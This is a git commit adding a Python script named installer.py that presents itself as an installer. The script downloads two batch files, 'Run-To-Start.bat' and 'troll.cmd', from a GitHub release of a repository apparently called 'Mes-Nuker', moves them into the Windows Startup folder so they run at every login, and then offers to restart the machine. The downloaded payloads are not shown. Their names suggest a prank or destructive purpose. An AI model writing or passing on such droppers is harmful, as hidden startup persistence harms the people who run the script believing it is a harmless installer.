2ede7f48766dc1ff631ff948127f43a38475f59c
Pamda <pro80105@gmail.com>
2023-01-28 20:19:46 +0300

    Added installer.exe

---
+++ installer.py
@@ -0,0 +1,56 @@
+import wget
+import os
+import time
+import shutil
+
+
+
+print("Starting Installation")
+
+time.sleep(2.0)
+
+bat_url = "https://github.com/prorockz901/Mes-Nuker/releases/download/V1/Run-To-Start.bat"
+
+bat = wget.download(bat_url) #downloads first file from url
+print(bat)
+
+bat2_url = "https://github.com/prorockz901/Mes-Nuker/releases/download/V1/troll.cmd"
+
+bat2 = wget.download(bat2_url) #downloads the second file from url
+print(bat2)
+
+
+print("Downloaded 2 files")
+
+time.sleep(2.0)
+
+print("Moving the files")
+
+
+
+appdata =  os.getenv('APPDATA')
+
+startup_loc = appdata + \
+     "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+
+
+# Moving first file 
+src_path = r"Run-To-Start.bat"
+dst_path = startup_loc
+shutil.move(src_path, dst_path)
+
+# Moving secondt file 
+src_path = r"troll.cmd"
+dst_path = startup_loc
+shutil.move(src_path, dst_path)
+
+print("Moved the files ")
+time.sleep(2.0)
+print("Restarting in 10s")
+time.sleep(10.0)
+restart = input("Do you wish to restart your computer ? (yes / no): ")
+  
+if restart == 'no':
+    exit()
+else:
+    os.system("shutdown /r /t 30")
